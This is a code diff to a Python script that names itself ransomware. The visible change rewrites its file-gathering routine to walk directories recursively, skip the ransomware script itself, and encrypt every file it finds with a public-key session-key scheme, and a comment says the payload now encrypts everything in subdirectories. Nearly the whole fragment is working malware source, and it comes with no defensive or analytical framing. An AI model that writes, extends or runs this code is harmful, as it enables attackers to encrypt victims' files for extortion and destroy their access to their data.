@@ -64,18 +64,17 @@ def encrypt(datafile, publickey):
         [ thefile.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
 
 # Gather the files
-def gather():
-    for file in os.listdir():
-        if os.path.isfile(file):
-            if file == "{filename}":
+def gather(path):
+    for root, dirs, files_list in os.walk(path):
+        for file in files_list:
+            if file == "ransomware.py":
                 continue
-            files.append(file)
+            files.append(os.path.join(root, file))
+    return files
 
-    for file in files:
-        encrypt(file, public_key)
-        print("Files encrypted...")
-
-gather()
+gather('.')
+for file in files:
+    encrypt(file, public_key)
 
 # This way the payload encrypts everything in subdirectories
 subdir = []
